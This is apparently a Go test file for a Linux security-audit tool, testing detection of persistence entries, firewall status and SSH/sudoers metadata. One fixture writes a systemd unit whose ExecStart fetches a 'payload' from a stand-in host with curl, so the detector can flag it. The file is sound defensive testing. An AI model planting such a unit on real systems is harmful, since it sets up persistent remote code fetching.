package checks

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/hemp-dev/quietscope/internal/audit"
	"github.com/hemp-dev/quietscope/internal/platform"
)

func TestLinuxSystemdUnitDetectsSuspiciousExecStart(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "demo.service")
	body := "[Unit]\nDescription=demo\n[Service]\nExecStart=/usr/bin/curl https://example.invalid/payload\n[Install]\nWantedBy=multi-user.target\n"
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	f := inspectLinuxSystemdUnit(path, dir, "system")
	if f.Status != audit.StatusWarn {
		t.Fatalf("expected warn status, got %s: %#v", f.Status, f)
	}
	if !f.CommandExecutionRisk || !f.NetworkExfiltrationRisk {
		t.Fatalf("expected command/network risk, got command=%t network=%t evidence=%s", f.CommandExecutionRisk, f.NetworkExfiltrationRisk, f.Evidence)
	}
	if !strings.Contains(f.Evidence, "ExecStart") {
		t.Fatalf("expected ExecStart evidence, got %s", f.Evidence)
	}
}

func TestLinuxPersistenceFixtureFindings(t *testing.T) {
	root := t.TempDir()
	systemdDir := filepath.Join(root, "systemd")
	cronDir := filepath.Join(root, "cron.d")
	autostartDir := filepath.Join(root, "autostart")
	home := filepath.Join(root, "home")
	for _, dir := range []string{systemdDir, cronDir, autostartDir, home} {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.WriteFile(filepath.Join(systemdDir, "safe.timer"), []byte("[Timer]\nOnCalendar=daily\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(cronDir, "backup"), []byte("0 * * * * root /usr/local/bin/backup\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(autostartDir, "demo.desktop"), []byte("[Desktop Entry]\nExec=/usr/bin/demo\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	findings := linuxPersistenceFindingsForPaths(home, linuxPathSet{
		systemdDirs:       []string{systemdDir},
		cronPaths:         []string{cronDir},
		autostartDirs:     []string{autostartDir},
		shellStartupFiles: []string{filepath.Join(home, ".profile")},
	})
	if len(findings) == 0 {
		t.Fatal("expected Linux persistence findings")
	}
	if !hasFindingPrefix(findings, "linux-systemd-unit-") {
		t.Fatalf("expected systemd unit finding, got %#v", findings)
	}
	if !hasFindingPrefix(findings, "linux-cron-file-") {
		t.Fatalf("expected cron finding, got %#v", findings)
	}
	if !hasFindingPrefix(findings, "linux-autostart-file-") {
		t.Fatalf("expected autostart finding, got %#v", findings)
	}
}

func TestLinuxFirewallOutputParsing(t *testing.T) {
	status, severity, _ := classifyLinuxFirewallOutput("ufw", "Status: active\n")
	if status != audit.StatusPass || severity != audit.SeverityInfo {
		t.Fatalf("expected active ufw pass/info, got %s/%s", status, severity)
	}
	status, severity, _ = classifyLinuxFirewallOutput("ufw", "Status: inactive\n")
	if status != audit.StatusWarn || severity != audit.SeverityMedium {
		t.Fatalf("expected inactive ufw warn/medium, got %s/%s", status, severity)
	}
	status, severity, _ = classifyLinuxFirewallOutput("firewall-cmd", "not running\n")
	if status != audit.StatusWarn || severity != audit.SeverityMedium {
		t.Fatalf("expected stopped firewalld warn/medium, got %s/%s", status, severity)
	}
}

func TestLinuxFirewallUnavailableFindingIsInfo(t *testing.T) {
	f := linuxFirewallUnavailableFinding("ufw: executable file not found")
	if f.Status != audit.StatusInfo || f.Severity != audit.SeverityInfo {
		t.Fatalf("expected unavailable firewall info/info, got %s/%s", f.Status, f.Severity)
	}
}

func TestLinuxSecurityMetadataFixtures(t *testing.T) {
	root := t.TempDir()
	home := filepath.Join(root, "home")
	sshDir := filepath.Join(home, ".ssh")
	systemSSH := filepath.Join(root, "etc", "ssh")
	sudoersDir := filepath.Join(root, "etc", "sudoers.d")
	updatePath := filepath.Join(root, "var", "lib", "apt", "periodic", "update-success-stamp")
	for _, dir := range []string{sshDir, systemSSH, sudoersDir, filepath.Dir(updatePath)} {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.WriteFile(filepath.Join(sshDir, "id_ed25519"), []byte("not read by test"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(systemSSH, "ssh_host_ed25519_key"), []byte("not read by test"), 0o600); err != nil {
		t.Fatal(err)
	}
	sudoersFile := filepath.Join(root, "etc", "sudoers")
	if err := os.WriteFile(sudoersFile, []byte("# not read by check"), 0o440); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(sudoersDir, "demo"), []byte("# not read by check"), 0o440); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(updatePath, []byte{}, 0o644); err != nil {
		t.Fatal(err)
	}
	old := time.Now().AddDate(0, 0, -45)
	if err := os.Chtimes(updatePath, old, old); err != nil {
		t.Fatal(err)
	}

	findings := linuxSecurityFindingsForPaths(context.Background(), platform.NewRunner(true), linuxSecurityPathSet{
		home:           home,
		systemSSHDir:   systemSSH,
		sudoersFile:    sudoersFile,
		sudoersDir:     sudoersDir,
		updateMetadata: []string{updatePath},
	})
	if !hasFindingPrefix(findings, "linux-ssh-metadata-") {
		t.Fatalf("expected system SSH metadata finding, got %#v", findings)
	}
	if !hasFindingPrefix(findings, "linux-update-metadata-") {
		t.Fatalf("expected update metadata finding, got %#v", findings)
	}
	if !hasFindingPrefix(findings, "linux-sudoers-entry-") {
		t.Fatalf("expected sudoers metadata finding, got %#v", findings)
	}
}

func hasFindingPrefix(findings []audit.Finding, prefix string) bool {
	for _, f := range findings {
		if strings.HasPrefix(f.ID, prefix) {
			return true
		}
	}
	return false
}
